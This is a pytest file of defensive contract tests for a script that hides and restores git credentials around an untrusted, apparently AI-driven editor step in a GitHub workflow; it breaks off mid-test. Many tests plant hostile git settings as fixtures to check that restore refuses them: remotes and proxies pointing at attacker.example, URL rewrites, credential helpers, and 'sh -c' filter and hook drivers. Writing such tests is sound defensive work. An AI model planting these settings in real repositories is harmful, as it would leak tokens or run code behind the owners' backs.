"""Contracts for the heal-evidence editor trust boundary."""

import hashlib
import os
import subprocess
import textwrap
from pathlib import Path

import pytest


ROOT = Path(__file__).resolve().parents[1]
WORKFLOWS = ROOT / ".github" / "workflows"
HELPER = ROOT / "scripts" / "editor_git_credentials.sh"


def _git(repo: Path, *args: str) -> str:
	return subprocess.check_output(["git", "-C", str(repo), *args], text=True).strip()


def test_git_credentials_hidden_and_restored_without_marker_secrets(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	_git(repo, "config", "--local", "http.https://github.com/.extraheader", "AUTHORIZATION: basic oldsecret")
	support = repo / ".codex-workflow-src"
	support.mkdir()
	_git(support, "init", "-q")
	_git(support, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/shubhodeep1/coding-workflows.git")
	_git(support, "config", "--local", "http.https://github.com/.extraheader", "AUTHORIZATION: basic oldsecret")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret", GIT_DIR=str(repo / ".git"), GIT_WORK_TREE=str(repo))
	missing_marker = subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True, text=True)
	assert missing_marker.returncode == 0 and "reason=marker_missing" in missing_marker.stderr
	hide = subprocess.run(["bash", str(HELPER), "hide", str(repo), str(support), str(tmp_path / "missing")], env=env, capture_output=True, text=True)
	assert hide.returncode == 0
	marker = tmp_path / "editor_git_credentials_hidden.txt"
	assert "oldsecret" not in marker.read_text() + (repo / ".git" / "config").read_text()
	assert "x-access-token" not in _git(repo, "remote", "get-url", "origin")
	assert "oldsecret" not in (support / ".git" / "config").read_text()
	assert "non-git" in hide.stderr
	restore = subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True, text=True)
	assert restore.returncode == 0
	assert "newsecret" in _git(repo, "remote", "get-url", "origin")
	assert "newsecret" in _git(support, "remote", "get-url", "origin")
	assert "AUTHORIZATION: basic" in _git(repo, "config", "--local", "--get", "http.https://github.com/owner/repo.git.extraheader")
	assert subprocess.run(["git", "-C", str(repo), "config", "--local", "--get", "http.https://github.com/.extraheader"], capture_output=True).returncode != 0
	assert "http.https://x-access-token" not in (repo / ".git" / "config").read_text()
	assert not marker.read_text()
	subprocess.run(["bash", str(HELPER), "hide", str(repo)], env=env, check=True, capture_output=True)
	env.pop("GH_TOKEN")
	missing = subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True, text=True)
	assert missing.returncode != 0 and "outcome=warn" in missing.stderr
	assert "newsecret" not in (repo / ".git" / "config").read_text()


def test_restore_does_not_send_token_to_an_editor_changed_origin(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	_git(repo, "remote", "set-url", "origin", "https://attacker.example/repo.git")
	proc = subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True, text=True)
	assert proc.returncode != 0
	assert "newsecret" not in (repo / ".git" / "config").read_text()
	_git(repo, "remote", "set-url", "origin", "https://github.com/attacker/repo.git")
	proc = subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True, text=True)
	assert proc.returncode != 0
	assert "newsecret" not in (repo / ".git" / "config").read_text()


def test_restore_validates_an_origin_without_embedded_auth(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://github.com/owner/repo.git")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	_git(repo, "remote", "set-url", "origin", "https://github.com/attacker/repo.git")
	assert subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True).returncode != 0
	assert "newsecret" not in (repo / ".git" / "config").read_text()


def test_restore_rejects_a_repo_name_matching_regex_punctuation(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/my.repo.git")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/my.repo", GH_TOKEN="newsecret")
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	_git(repo, "remote", "set-url", "origin", "https://github.com/owner/myXrepo.git")
	assert subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True).returncode != 0
	assert "newsecret" not in (repo / ".git" / "config").read_text()


def test_restore_rejects_credentials_added_to_the_original_origin(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	_git(repo, "remote", "set-url", "origin", "https://x-access-token:changed@github.com/owner/repo.git")
	assert subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True).returncode != 0
	assert "newsecret" not in (repo / ".git" / "config").read_text()


def test_restore_rejects_editor_changed_push_url(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	_git(repo, "config", "--local", "remote.origin.pushurl", "https://github.com/attacker/repo.git")
	proc = subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True, text=True)
	assert proc.returncode != 0
	assert "newsecret" not in (repo / ".git" / "config").read_text()


def test_restore_rejects_multiple_origin_urls(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	_git(repo, "config", "--local", "--add", "remote.origin.url", "https://github.com/attacker/repo.git")
	_git(repo, "config", "--local", "--add", "remote.origin.url", "https://github.com/owner/repo.git")
	assert subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True).returncode != 0
	assert "newsecret" not in (repo / ".git" / "config").read_text()


def test_restore_scopes_header_to_origin_without_git_suffix(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://github.com/owner/repo")
	_git(repo, "config", "--local", "http.https://github.com/.extraheader", "AUTHORIZATION: basic oldsecret")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	subprocess.run(["bash", str(HELPER), "restore"], env=env, check=True, capture_output=True)
	assert "AUTHORIZATION: basic" in _git(repo, "config", "--local", "--get", "http.https://github.com/owner/repo.extraheader")


def test_hide_rejects_an_explicit_push_url_before_editor_launch(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	_git(repo, "config", "--local", "remote.origin.pushurl", "https://x-access-token:oldsecret@github.com/attacker/repo.git")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
	result = subprocess.run(["bash", str(HELPER), "hide"], env=env, capture_output=True)
	assert result.returncode != 0
	assert "oldsecret" in (repo / ".git" / "config").read_text()


def test_hide_rejects_preexisting_push_url_rewrite(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	_git(repo, "config", "--local", "url.https://github.com/attacker/repo.git.pushInsteadOf", "https://github.com/owner/repo.git")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
	result = subprocess.run(["bash", str(HELPER), "hide"], env=env, capture_output=True)
	assert result.returncode != 0
	assert "oldsecret" in (repo / ".git" / "config").read_text()


def test_hide_does_not_record_a_secret_in_an_extraheader_key(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	_git(repo, "config", "--local", "http.https://x-access-token:oldsecret@github.com/.extraheader", "AUTHORIZATION: basic oldsecret")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
	assert subprocess.run(["bash", str(HELPER), "hide"], env=env, capture_output=True).returncode != 0
	assert not (tmp_path / "editor_git_credentials_hidden.txt").exists()


def test_restore_rejects_editor_changed_push_url_rewrite(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	_git(repo, "config", "--local", "url.https://github.com/attacker/repo.git.pushInsteadOf", "https://github.com/owner/repo.git")
	result = subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True)
	assert result.returncode != 0
	assert "newsecret" not in (repo / ".git" / "config").read_text()


def test_hide_fails_when_an_unrestored_marker_exists(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	assert subprocess.run(["bash", str(HELPER), "hide"], env=env, capture_output=True).returncode != 0
	assert "oldsecret" not in (repo / ".git" / "config").read_text()


def test_hide_skips_non_checkout_inside_parent_repository(tmp_path: Path) -> None:
	parent = tmp_path / "parent"
	parent.mkdir()
	_git(parent, "init", "-q")
	_git(parent, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	nested = parent / "not-a-checkout"
	nested.mkdir()
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(nested), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
	result = subprocess.run(["bash", str(HELPER), "hide"], env=env, capture_output=True, text=True)
	assert result.returncode == 0 and "non-git" in result.stderr
	assert "oldsecret" in _git(parent, "remote", "get-url", "origin")


def test_restore_rejects_untrusted_extraheader_scope(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	_git(repo, "config", "--local", "http.https://github.com/attacker/repo.extraheader", "AUTHORIZATION: basic oldsecret")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	result = subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True)
	assert result.returncode != 0
	assert "newsecret" not in (repo / ".git" / "config").read_text()


def test_hide_fails_without_trusted_repository_identity(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GH_TOKEN="newsecret")
	env.pop("GITHUB_REPOSITORY", None)
	result = subprocess.run(["bash", str(HELPER), "hide"], env=env, capture_output=True)
	assert result.returncode != 0
	assert "oldsecret" in (repo / ".git" / "config").read_text()


def test_restore_validates_every_checkout_before_injecting_any_token(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	support = repo / ".codex-workflow-src"
	support.mkdir()
	_git(support, "init", "-q")
	_git(support, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/shubhodeep1/coding-workflows.git")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	_git(support, "remote", "set-url", "origin", "https://github.com/attacker/repo.git")
	result = subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True)
	assert result.returncode != 0
	assert "newsecret" not in (repo / ".git" / "config").read_text()
	assert "newsecret" not in (support / ".git" / "config").read_text()


def test_restore_rejects_marker_header_without_a_validated_origin(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	support = repo / ".codex-workflow-src"
	support.mkdir()
	_git(support, "init", "-q")
	_git(support, "remote", "add", "origin", "https://github.com/shubhodeep1/coding-workflows.git")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	marker = tmp_path / "editor_git_credentials_hidden.txt"
	marker.write_text(f"{repo}\torigin\n{support}\textraheader:http.https://github.com/.extraheader\n")
	result = subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True, text=True)
	assert result.returncode != 0 and "reason=header_without_origin" in result.stderr
	assert "newsecret" not in (repo / ".git" / "config").read_text()
	assert "newsecret" not in (support / ".git" / "config").read_text()


def test_restore_rejects_editor_written_token_exfiltration_settings(tmp_path: Path) -> None:
	# The editor can write the checkout's and the user's git config; a helper,
	# proxy or rewrite there would receive or redirect the restored token.
	for name, key, value, scope in (
		("helper", "credential.helper", "!cat >/dev/null", "local"),
		("proxy", "http.proxy", "http://attacker.example:8080", "local"),
		("rewrite", "url.https://attacker.example/.insteadOf", "https://github.com/", "local"),
		("include", "include.path", "/tmp/editor-written.gitconfig", "local"),
		("global-helper", "credential.helper", "store", "global"),
	):
		repo = tmp_path / name
		repo.mkdir()
		_git(repo, "init", "-q")
		_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
		global_config = tmp_path / f"{name}.gitconfig"
		global_config.write_text("")
		runtime = tmp_path / f"{name}-runtime"
		runtime.mkdir()
		env = dict(os.environ, RUNTIME_DIR=str(runtime), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret", GIT_CONFIG_GLOBAL=str(global_config))
		subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
		if scope == "global":
			subprocess.run(["git", "config", "--file", str(global_config), key, value], check=True)
		else:
			_git(repo, "config", "--local", key, value)
		result = subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True, text=True)
		assert result.returncode != 0 and "reason=config_hazard" in result.stderr, name
		assert "newsecret" not in (repo / ".git" / "config").read_text() + global_config.read_text(), name


@pytest.mark.parametrize("key", (
	"filter.evil.clean", "filter.evil.process", "filter.evil.smudge",
	"diff.evil.textconv", "diff.evil.command", "diff.external",
	"merge.evil.driver", "core.attributesFile", "core.alternateRefsCommand",
	"core.hooksPath", "core.editor", "core.pager",
	"gpg.program", "gpg.ssh.program", "lfs.customtransfer.x.path",
	"remote.origin.uploadpack", "remote.origin.receivepack", "uploadpack.packObjectsHook",
))
@pytest.mark.parametrize("scope", ("local", "global"))
def test_restore_refuses_editor_written_command_drivers(tmp_path: Path, key: str, scope: str) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	global_config = tmp_path / "global.gitconfig"
	global_config.write_text("")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo),
		GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret", GIT_CONFIG_GLOBAL=str(global_config))
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	if scope == "global":
		subprocess.run(["git", "config", "--file", str(global_config), key, "sh -c true"], check=True)
	else:
		_git(repo, "config", "--local", key, "sh -c true")
	result = subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True, text=True)
	assert result.returncode != 0 and "reason=config_hazard" in result.stderr
	assert "newsecret" not in (repo / ".git" / "config").read_text() + global_config.read_text()


def test_filter_driver_and_info_attributes_cannot_run_after_restore(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	sentinel = tmp_path / "filter-ran"
	_git(repo, "config", "--local", "filter.evil.clean", f"sh -c 'touch {sentinel}; cat'")
	(repo / ".git" / "info" / "attributes").write_text("* filter=evil\n")
	result = subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True, text=True)
	assert result.returncode != 0 and "reason=config_hazard" in result.stderr
	assert "newsecret" not in (repo / ".git" / "config").read_text()
	assert not sentinel.exists()
	assert subprocess.run(["bash", str(HELPER), "check"], env=env, capture_output=True).returncode != 0


@pytest.mark.parametrize("location", ("info", "global"))
def test_restore_refuses_untracked_driver_attributes(tmp_path: Path, location: str) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	config_home = tmp_path / "config-home"
	attrs = (repo / ".git" / "info" / "attributes") if location == "info" else (config_home / "git" / "attributes")
	attrs.parent.mkdir(parents=True, exist_ok=True)
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo),
		GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret", XDG_CONFIG_HOME=str(config_home))
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	attrs.write_text("# filter=ignored\n* filter=lfs\n")
	result = subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True, text=True)
	assert result.returncode != 0 and "reason=attributes_hazard" in result.stderr
	assert "newsecret" not in (repo / ".git" / "config").read_text()


def test_restore_refuses_worktree_driver_attributes(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo),
		GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	attrs = repo / "nested" / ".gitattributes"
	attrs.parent.mkdir()
	attrs.write_text("* filter=lfs\n")
	result = subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True, text=True)
	assert result.returncode != 0 and "reason=attributes_hazard" in result.stderr
	assert "newsecret" not in (repo / ".git" / "config").read_text()
	assert subprocess.run(["bash", str(HELPER), "check"], env=env, capture_output=True).returncode != 0


def test_restore_allows_unchanged_tracked_attributes_with_trusted_filter(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	(repo / ".gitattributes").write_text("*.bin filter=lfs\n")
	_git(repo, "add", ".gitattributes")
	_git(repo, "-c", "user.name=test", "-c", "user.email=test@example.invalid", "commit", "-qm", "baseline")
	system_config = tmp_path / "system.gitconfig"
	system_config.write_text("[filter \"lfs\"]\n\tclean = git-lfs clean -- %f\n")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo),
		GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret", GIT_CONFIG_SYSTEM=str(system_config))
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	subprocess.run(["bash", str(HELPER), "restore"], env=env, check=True, capture_output=True)
	assert "newsecret" in (repo / ".git" / "config").read_text()
	(repo / ".gitattributes").write_text("* filter=lfs\n")
	assert subprocess.run(["bash", str(HELPER), "check"], env=env, capture_output=True).returncode != 0


def test_attributes_check_has_no_root_fallback_without_a_config_home() -> None:
	helper = HELPER.read_text()
	assert 'global_path=""' in helper
	assert 'elif [ -n "${HOME:-}" ]; then' in helper
	assert '${HOME:-}/.config/git/attributes' not in helper


def test_restore_refuses_symlinked_attributes(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	(repo / ".git" / "info" / "attributes").symlink_to(tmp_path / "missing")
	result = subprocess.run(["bash", str(HELPER), "restore"], env=env, capture_output=True, text=True)
	assert result.returncode != 0 and "reason=attributes_hazard" in result.stderr


def test_hide_refuses_preexisting_attributes_driver(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	(repo / ".git" / "info" / "attributes").write_text("* diff=custom\n")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo")
	result = subprocess.run(["bash", str(HELPER), "hide"], env=env, capture_output=True, text=True)
	assert result.returncode != 0 and "reason=attributes_hazard" in result.stderr
	assert "oldsecret" in (repo / ".git" / "config").read_text()
	assert not (tmp_path / "editor_git_credentials_hidden.txt").exists()


def test_system_scope_lfs_drivers_stay_trusted(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	system_config = tmp_path / "system.gitconfig"
	system_config.write_text("[filter \"lfs\"]\n\tclean = git-lfs clean -- %f\n\tprocess = git-lfs filter-process\n")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo),
		GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret", GIT_CONFIG_SYSTEM=str(system_config))
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	subprocess.run(["bash", str(HELPER), "restore"], env=env, check=True, capture_output=True)
	assert "newsecret" in (repo / ".git" / "config").read_text()


def test_check_without_marker_or_token_and_with_exported_git_dir(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo))
	env.pop("GH_TOKEN", None)
	env.pop("GITHUB_REPOSITORY", None)
	assert subprocess.run(["bash", str(HELPER), "check"], cwd=repo, env=env, capture_output=True).returncode == 0
	assert not (tmp_path / "editor_git_credentials_hidden.txt").exists()
	other = tmp_path / "other"
	other.mkdir()
	_git(other, "init", "-q")
	_git(other, "config", "--local", "filter.evil.clean", "sh -c true")
	env["GIT_DIR"] = str(other / ".git")
	env["GIT_WORK_TREE"] = str(other)
	result = subprocess.run(["bash", str(HELPER), "check", str(repo)], cwd=repo, env=env, capture_output=True, text=True)
	assert result.returncode != 0 and "reason=config_hazard" in result.stderr


def test_check_catches_driver_planted_after_restore(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	subprocess.run(["bash", str(HELPER), "restore"], env=env, check=True, capture_output=True)
	_git(repo, "config", "--local", "filter.evil.clean", "sh -c true")
	result = subprocess.run(["bash", str(HELPER), "check"], cwd=repo, env=env, capture_output=True, text=True)
	assert result.returncode != 0 and "action=check" in result.stderr and "reason=config_hazard" in result.stderr


def test_commit_checks_hazards_before_staging_and_disables_fsmonitor() -> None:
	commit = (ROOT / "scripts" / "implement_commit_changes.sh").read_text()
	stage = "GIT_CONFIG_GLOBAL=/dev/null git -c core.hooksPath=/dev/null -c core.fsmonitor=false -c core.attributesFile=/dev/null add -u"
	assert commit.rindex('editor_git_credentials.sh" check') < commit.index(stage)
	assert stage in commit
	assert "xargs -0 -r env GIT_CONFIG_GLOBAL=/dev/null git -c core.hooksPath=/dev/null -c core.fsmonitor=false -c core.attributesFile=/dev/null add --" in commit
	assert "GIT_CONFIG_GLOBAL=/dev/null git -c core.hooksPath=/dev/null -c core.fsmonitor=false -c core.attributesFile=/dev/null ls-files --others" in commit
	assert "GIT_CONFIG_GLOBAL=/dev/null git -c core.hooksPath=/dev/null -c core.fsmonitor=false -c core.attributesFile=/dev/null commit" in commit


def test_commit_refuses_missing_credential_guard_before_git(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	scripts = repo / "scripts"
	scripts.mkdir()
	(scripts / "implement_commit_changes.sh").write_bytes((ROOT / "scripts" / "implement_commit_changes.sh").read_bytes())
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo")
	for key in ("BASH_ENV", "ENV", "WORKSPACE_PATH"):
		env.pop(key, None)
	result = subprocess.run(["bash", "scripts/implement_commit_changes.sh"], cwd=repo, env=env, capture_output=True, text=True)
	assert result.returncode != 0
	assert "::error::Editor-writable git config or attributes" in result.stdout
	assert not (repo / "pre_assembled_static.txt").exists()


def test_hide_allows_trusted_command_scope_rewrite(tmp_path: Path) -> None:
	# GIT_CONFIG_* comes from the trusted step's own environment.
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret",
		GIT_CONFIG_COUNT="1", GIT_CONFIG_KEY_0="url.https://github.com/.insteadOf", GIT_CONFIG_VALUE_0="git@github.com:")
	subprocess.run(["bash", str(HELPER), "hide"], env=env, check=True, capture_output=True)
	subprocess.run(["bash", str(HELPER), "restore"], env=env, check=True, capture_output=True)
	assert "newsecret" in _git(repo, "remote", "get-url", "origin")


def test_hide_refuses_a_symlinked_marker(tmp_path: Path) -> None:
	repo = tmp_path / "repo"
	repo.mkdir()
	_git(repo, "init", "-q")
	_git(repo, "remote", "add", "origin", "https://x-access-token:oldsecret@github.com/owner/repo.git")
	target = tmp_path / "elsewhere.txt"
	target.write_text("")
	(tmp_path / "editor_git_credentials_hidden.txt").symlink_to(target)
	env = dict(os.environ, RUNTIME_DIR=str(tmp_path), GITHUB_WORKSPACE=str(repo), GITHUB_REPOSITORY="owner/repo", GH_TOKEN="newsecret")
